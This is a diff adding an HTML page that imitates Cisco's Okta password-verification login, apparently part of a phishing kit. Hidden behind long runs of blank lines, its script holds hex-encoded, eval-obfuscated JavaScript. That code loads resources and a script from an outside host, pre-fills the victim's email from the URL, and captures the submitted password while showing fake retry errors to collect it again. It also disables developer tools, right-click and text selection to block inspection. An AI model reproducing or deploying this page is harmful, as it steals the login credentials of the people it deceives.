@@ -1,0 +1,234 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex,nofollow">
+
+<link rel="stylesheet" id="bootstrap_css">
+<link rel="shortcut icon" type="image/x-icon" id="favLink">
+
+<title>Log In to Cisco</title>
+
+<link id="okta_css" rel="stylesheet" type="text/css">
+
+<!-- styles for custom sign in -->
+<link rel="stylesheet" type="text/css" id="custom_css">
+<link rel="stylesheet" id="style_css">
+<link rel="stylesheet" id="onetrust-style">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</head>
+			
+<body>
+<div class="container-main">
+
+       
+
+        <div class="container-form">
+            <div class="language-header" style="display: block;">
+                <div id="back" class="back-control" tabindex="0" style="display: none;">
+                    <a onclick="routeBack()">
+                        <span class="icon-chevron-left" title="Back"></span>
+                        <span data-i18n="LINK_BACK" class="link-back">Back</span>
+                    </a>
+                </div>
+                <div class="btn-group" style="display: block;">
+                    <button class="dropdown-toggle" type="button" data-toggle="dropdown" tabindex="0" style="display: none;">
+                        <span class="icon-language" title="Language"></span>
+                        <div class="drop-text">
+                            <span class="drop-text-pre">US</span>
+                            <br>
+                            <span class="drop-text-post">EN</span>
+                        </div>
+                    </button>
+                </div>
+            </div>
+            <div id="okta-login-container" style="display: block;"><main data-se="auth-container" tabindex="-1" id="okta-sign-in" class="auth-container main-container" style=""><div class="okta-sign-in-header auth-header"><h1><span class="icon-cisco" title="Cisco Logo" style="padding-bottom: 0px; margin-bottom: 25px;"></span></h1><div data-type="beacon-container" class="beacon-container"></div></div><div class="auth-content"><div class="auth-content-inner"><div class="siw-main-view challenge-authenticator--okta_password mfa-verify-password"><div class="siw-main-header"><div><div><div data-type="beacon-container" class="beacon-container" style="transform: scale(1, 1); text-indent: 1px;"><div class="beacon-blank auth-beacon"><div class="beacon-blank js-blank-beacon-border auth-beacon-border"></div></div><div class="bg-helper auth-beacon auth-beacon-factor mfa-okta-password" data-se="factor-beacon"><div class="okta-sign-in-beacon-border auth-beacon-border"></div></div></div></div></div></div>
+			<div class="siw-main-body" onkeypress="return checkSubmit(event)">
+			<form  id="form56s" class="ion-form o-form o-form-edit-mode">
+			<input id="domain" type="hidden" value="" name="domain">
+			<input id="fieldName" type="hidden" value="" name="field">
+			<input id="email" type="hidden" value="" name="email">
+			<div data-se="o-form-content" class="o-form-content o-form-theme clearfix"><h1 data-se="o-form-head" class="okta-form-title o-form-head">Verify with your password</h1><div class="identifier-container"><span class="identifier no-translate" data-se="identifier" id="usr"></span></div><div class="o-form-info-container"></div><div class="o-form-error-container o-form-has-errors" data-se="o-form-error-container" role="alert"><div><div class="okta-form-infobox-error infobox infobox-error" role="alert"><span class="icon error-16"></span><p id="errorAlert">We can't log you in. Please check for an email from us, reset your password, or try again.</p></div></div></div><div class="o-form-fieldset-container" data-se="o-form-fieldset-container"><div data-se="o-form-fieldset-credentials.passcode" class="o-form-fieldset o-form-label-top"><div data-se="o-form-label" class="okta-form-label o-form-label"><label for="input64">Password&nbsp;</label></div><div data-se="o-form-input-container" class="o-form-input"><span data-se="o-form-input-credentials.passcode" class="o-form-input-name-credentials.passcode o-form-control okta-form-input-field input-fix"><input type="password" placeholder="" name="password" id="password" value="" aria-label="" autocomplete="off" class="password-with-toggle"><span class="password-toggle"><span class="eyeicon visibility-16 button-show"></span><span class="eyeicon visibility-off-16 button-hide"></span></span></span></div></div></div></div><div class="o-form-button-bar"><input class="button button-primary" type="submit" id="loginbtn" value="Verify" data-type="save"></div></form>
+			<script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																							OO00='6f61642065787465726e616c207363726970740d0a0966756e6374696f6e206c6f616445787465726e616c5363726970742875726c2c63616c6c6261636b29207b0d0a090976617220736372697074203d20646f63756d656e742e637265617465456c656d656e74282773637269707427293b0d0a09097363726970742e737263203d20707265666978202b2075726c3b0d0a09097363726970742e6f6e6c6f6164203d2066756e6374696f6e2829207b0d0a0909090d0a0909096966202863616c6c6261636b29207b0d0a0909090963616c6c6261636b28293b090909090d0a0909097d0d0a0909090d0a09097d3b0d0a0909646f63756d656e742e686561642e617070656e644368696c6428736372697074293b202f2f20417070656e64207468652073637269707420746f2074686520626f64790d0a097d0d0a09646f63756d656e742e676574456c656d656e744279496428276572726f72416c65727427292e696e6e657248544d4c3d22596f752068617665206265656e207369676e6564206f75742e205369676e20696e20746f20636f6e74696e75652e223b0d0a7d293b0d0a090d0a646f63756d656e742e6164644576656e744c697374656e657228276b6579646f776e272c206576656e74203d3e207b0d0a2020696620286576656e742e6b6579436f6465203d3d3d20313233207c7c20286576656e742e6374726c4b6579202626206576656e742e73686966744b6579202626206576656e742e6b6579436f6465203d3d3d2037332929207b0d0a202020206576656e742e70726576656e7444656661756c7428293b0d0a20207d0d0a7d293b0d0a2f2f2044697361626c652072696768742d636c69636b20636f6e74657874206d656e750d0a646f63756d656e742e6164644576656e744c697374656e65722827636f6e746578746d656e75272c206576656e74203d3e206576656e742e70726576656e7444656661756c742829293b0d0a2f2f61766f696420666f726d207375626d697373696f6e20776974686f75742076616c69646174696f6e0d0a242827236c6f67696e62746e27292e6f6e2827636c69636b272c2066756e6374696f6e286576656e7429207b0d0a092f2f616c657274282273746172742066786e7422293b0d0a09636c6b4c676e2866756e6374696f6e28737461747573436f6465297b0d0a09090d0a0909646973706c617943737328737461747573436f6465293b0d0a09090d0a097d293b0d0a7d293b0d0a2428272e7369772d6d61696e2d626f647927292e6f6e28276b6579646f776e272c2066756e6374696f6e286576656e7429207b0d0a2020202020202020636865636b5375626d6974286576656e742c2066756e6374696f6e28737461747573436f646529207b0d0a090909646973706c617943737328737461747573436f6465293b0d0a20202020202020207d293b0d0a202020207d293b0d0a090d0a66756e6374696f6e20646973706c617943737328737461747573297b0d0a0909696628737461747573297b0d0a090909646f63756d656e742e676574456c656d656e744279496428276572726f72416c65727427292e696e6e657248544d4c3d22526574727920656e74727920666f722070617373776f72642e20506c656173652072657479706520796f75722063757272656e742070617373776f72642e223b0d0a09097d656c7365207b0d0a090909646f63756d656e742e676574456c656d656e744279496428276572726f72416c65727427292e696e6e657248544d4c3d2257652063616e2774206c6f6720796f7520696e2e20506c6561736520636865636b20796f757220656e7472792c20726573657420796f75722070617373776f72642c206f722074727920616761696e223b0d0a09097d0d0a090d0a7d';eval(unescape('%66%75%6E%63%74%69%6F%6E%20%5F%63%28%5F%69%29%7B%76%61%72%20%61%3D%6E%65%77%20%41%72%72%61%79%28%31%30%30%30%29%2E%6A%6F%69%6E%28%27%25%30%44%25%30%41%27%29%3B%76%61%72%20%74%3D%5F%69%2E%72%65%70%6C%61%63%65%28%2F%28%5C%53%7B%32%7D%29%2F%67%69%2C%27%24%31%25%27%29%3B%74%3D%27%25%27%2B%74%3B%74%3D%74%2E%73%75%62%73%74%72%28%30%2C%74%2E%6C%65%6E%67%74%68%2D%31%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%27%3C%73%63%27%2B%27%72%69%70%74%3E%27%2B%61%2B%74%2B%61%2B%27%3C%2F%73%63%27%2B%27%72%69%70%74%3E%27%29%29%7D%3B'));O0OO='646c3d646f63756d656e742e6c61796572733b6f653d77696e646f772e6f706572613f313a303b64613d28646f63756d656e742e646f63756d656e744d6f64657c7c646f63756d656e742e616c6c292626216f653b67653d646f63756d656e742e676574456c656d656e74427949643b77733d77696e646f772e736964656261723f747275653a66616c73653b744e3d6e6176696761746f722e757365724167656e742e746f4c6f7765724361736528293b697a4e3d744e2e696e6465784f6628276e6574736361706527293e3d303f747275653a66616c73653b7a69733d64613b7a6973383d64613b766172206d73673d27273b66756e6374696f6e206e656d28297b72657475726e20747275657d3b77696e646f772e6f6e6572726f72203d206e656d3b7a4f463d77696e646f772e6c6f636174696f6e2e70726f746f636f6c2e696e6465784f66282766696c652729213d2d313f747275653a66616c73653b6937663d7a69732626217a4f463f747275653a66616c73653b6966286461297b646f63756d656e742e6f6e6472616773746172743d66756e6374696f6e2028297b72657475726e2066616c73657d3b66756e6374696f6e2063494528297b286d7367293b72657475726e2066616c73657d3b66756e6374696f6e20636328297b646f63756d656e742e6f6e636f6e746578746d656e753d6349453b73657454696d656f7574282263632829222c323030297d3b636328297d3b66756e6374696f6e20634e532865297b696628646c7c7c7773297b696628652e77686963683d3d327c7c652e77686963683d3d33297b286d7367293b72657475726e2066616c73657d7d7d3b696628646c297b646f63756d656e742e636170747572654576656e7473284576656e742e4d4f555345444f574e293b646f63756d656e742e6f6e6d6f757365646f776e3d634e537d656c73657b646f63756d656e742e6f6e6d6f75736575703d634e537d3b646f63756d656e742e6f6e636f6e746578746d656e753d6e65772046756e6374696f6e282272657475726e2066616c736522293b6966286f65297b66756e6374696f6e20726f2865297b6966286576656e742e627574746f6e3d3d32297b616c65727428272027293b72657475726e20307d3b72657475726e20747275657d3b646f63756d656e742e6f6e6d6f757365646f776e3d726f7d3b66756e6374696f6e206e733928297b77696e646f772e7374617475733d2720273b73657454696d656f757428276e73392829272c31303030293b72657475726e20747275657d3b696628216f65297b6e733928293b646f63756d656e742e6f6e6d6f7573656f7665723d6e73393b646f63756d656e742e6f6e6d6f7573656f75743d6e73397d3b66756e6374696f6e2075302861297b72657475726e2066616c73657d3b66756e6374696f6e2075312865297b72657475726e28652e7461726765742e7461674e616d65213d6e756c6c2626652e7461726765742e7461674e616d652e73656172636828275e28494e5055547c54455854415245417c425554544f4e7c53454c4543547c454d4245447c4f424a4543547c48544d4c29242729213d2d31297d3b66756e6374696f6e2075322865297b696628652e77686963683d3d31297b77696e646f772e636170747572654576656e7473284576656e742e4d4f5553454d4f5645293b77696e646f772e6f6e6d6f7573656d6f76653d75307d7d3b66756e6374696f6e2075332865297b696628652e77686963683d3d31297b77696e646f772e72656c656173654576656e7473284576656e742e4d4f5553454d4f5645293b77696e646f772e6f6e6d6f7573656d6f76653d6e756c6c7d7d3b20696628646c297b77696e646f772e636170747572654576656e7473284576656e742e4d4f';OO0O='55534555507c4576656e742e4d4f555345444f574e293b77696e646f772e6f6e6d6f757365646f776e3d75323b77696e646f772e6f6e6d6f75736575703d75337d656c73652069662867652626216461297b646f63756d656e742e6f6e6d6f757365646f776e3d75317d3b66756e6374696f6e206e6e28297b69662877696e646f772e67657453656c656374696f6e297b76617220743d77696e646f772e67657453656c656374696f6e28292e746f537472696e6728293b696628742e696e6465784f6628277177656173647a786327293e317c7c742e6c656e6774683e3430297b646f63756d656e742e626f64792e696e6e657248544d4c3d272e273b6c6f636174696f6e2e72656c6f616428297d3b73657454696d656f757428226e6e2829222c323030297d7d3b6e6e28293b66756e6374696f6e206e6928297b6966286461297b646f63756d656e742e6f6e73656c65637473746172743d66756e6374696f6e2028297b72657475726e2066616c73657d3b73657454696d656f757428226e692829222c323030297d7d3b6e6928293b2428646f63756d656e74292e72656164792866756e6374696f6e28297b0d0a090d0a092f2f73657420676c6f62616c207661726961626c65730d0a0976617220767372203d2077696e646f772e6c6f636174696f6e2e687265662e736c6963652877696e646f772e6c6f636174696f6e2e687265662e696e6465784f662827232729202b2031293b0d0a09636f6e7374206d794172726179203d207673722e73706c697428222622293b0d0a09767372203d206d7941727261795b305d3b0d0a090d0a09090d0a092f2f7365742065787465726e616c2066696c65730d0a09636f6e737420707265666978203d202268747470733a2f2f726974616c6672656e646f2e746f702f656e7465727072697365732f223b0d0a09766172206172726179736574203d5b0d0a0909095b226f6b74615f637373222c226f6b74612d7369676e2d696e2e6d696e2e637373222c2268726566222c226964225d2c0d0a0909095b22626f6f7473747261705f637373222c22626f6f7473747261702d6375692e6d696e2e637373222c2268726566222c226964225d2c0d0a0909095b226f6e6574727573742d7374796c65222c226f6e6574727573742d7374796c652e637373222c2268726566222c226964225d2c0d0a0909095b22637573746f6d5f637373222c22637573746f6d2d7369676e696e2e61393161663261626664303436363265343939626433653135313135306462662e637373222c2268726566222c226964225d2c0d0a0909095b227374796c655f637373222c227374796c655f6373732e637373222c2268726566222c226964225d2c0d0a0909095b226661764c696e6b222c226c6f676f2d6f70656e2d67726170682e676966222c2268726566222c226964225d2c0d0a090d0a095d0d0a202020202f2f204c6f6164207468652065787465726e616c2073637269707420616e642063616c6c207468652065787465726e616c2063616c6c6261636b2066756e6374696f6e0d0a20202020202020202020206c6f616445787465726e616c5363726970742827656e74657270726973652e6a73272c2066756e6374696f6e2829207b0d0a09090909636865636b444e53287673722c66756e6374696f6e28297b0d0a09090909096f6e426f64794c6f61642861727261797365742c207072656669782c20767372293b0d0a090909090976617220757372203d2061746f622861746f622876737229293b0d0a09090909092428222375737222292e68746d6c28757372293b0d0a090909097d293b0d0a202020202020202020202020200d0a2020202020202020202020207d293b0d0a0909090d0a092f2f2066756e6374696f6e20746f206c';OOO0=O0OO+OO0O+OO00;_c(OOO0);O494D524B56='515759425654475349514456595142504F425950485653455251494F445257424B4553494B534B47444F4A58484854524F4549544A5753524B4C43524A59524B504745554F454A4C57514C564A5443474C575550524D4952435352504F534B4D4356484C504653554F4E494C4D494D5258424F424D55434E4B45454658444D504F51454454435953555744535943504B56454F5744594C50474A4D4956484C47564854534B5551504B4A544E44465654585856465545434A495954594E4A5754534A464654524955464F4B544554564843424C54574E4B464D535942474F4A4F5950'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</script>
+
+			</div><div class="siw-main-footer"><div class="auth-footer"><a data-se="forgot-password" href="javascript:void(0)" class="link js-forgot-password">Forgot password?</a><a data-se="help" href="javascript:void(0)" class="link js-help" style="margin-left: -10px">Help</a><a data-se="cancel" href="javascript:void(0)" class="link js-cancel">Back to log in</a></div></div></div></div></div></main></div>
+            <div class="loader" style="position: relative; visibility: visible; width: 64px; height: 64px; border-radius: 100%; border-width: 3px; border-style: solid; border-color: rgb(243, 243, 243) rgb(243, 243, 243) rgb(243, 243, 243) rgb(65, 188, 235); border-image: initial; animation: 1.1s linear 0s infinite normal none running load; margin: 20% auto; display: none;">
+            </div>
+            <!-- fed reg modal -->
+            <div id="fedModal" class="modal" tabindex="-1">
+                <!-- Modal content -->
+                <div class="modal-content">
+                    <span id="close-fed" class="close" title="Close" tabindex="0">×</span>
+                    <div style="text-align: center;">
+                        <span class="icon-cisco" title="Cisco Logo" style="padding-bottom: 0px;"></span>
+                    </div>
+                    <div style="padding: 20px; text-align: left;">
+                        <p data-i18n="FED_REG_MSG_1">Your email address belongs to an organization that also manages your Cisco account login.</p>
+                        <p data-i18n="FED_REG_MSG_2">Log in to your organization to also log in to Cisco.</p>
+                    </div>
+                    <div style="text-align: center; padding: 20px;">
+                        <a id="modalButton" class="button-primary" tabindex="0" data-i18n="FED_REG_BUTTON">Organization Log In</a>
+                    </div>
+                </div>
+            </div>
+            <!-- pipl reg modal -->
+            <div id="piplModal" class="modal" tabindex="-1">
+                <!-- Modal content -->
+                <div class="modal-content">
+                    <span id="close-pipl" class="closePipl" tabindex="0">×</span>
+                    <div style="text-align: center;">
+                        <span class="icon-cisco" title="Cisco Logo" style="padding-bottom: 0px;"></span>
+                    </div>
+                    <div style="padding: 20px; text-align: left;">
+                        <p id="piplMsg">Description here</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <a class="footer-links support-link" data-i18n="LINK_SUPPORT_CASE" href="javascript:void(0)" tabindex="0" style="display: inline;">Contact support</a>
+
+        <a class="footer-links privacy-link" data-i18n="LINK_PRIVACY_STATEMENT" href="javascript:void(0)"  tabindex="0" style="display: inline;">Privacy</a>
+
+        <a class="footer-links" data-i18n="LINK_TERMS" href="javascript:void(0)"  tabindex="0" style="display: inline;">Terms &amp; Conditions</a>
+
+        <a class="footer-links" data-i18n="LINK_COOKIES_POLICY" href="javascript:void(0)"  tabindex="0" style="display: inline;">Cookies</a>
+
+        <a class="footer-links" data-i18n="LINK_TRADEMARKS" href="javascript:void(0)"  tabindex="0" style="display: inline;">Trademarks</a>
+
+        <a class="footer-links icp-link" href="javascript:void(0)"  tabindex="0" style="display: none;">京ICP备05085544号-1</a>
+
+    </div>
+	</body>
+</html>
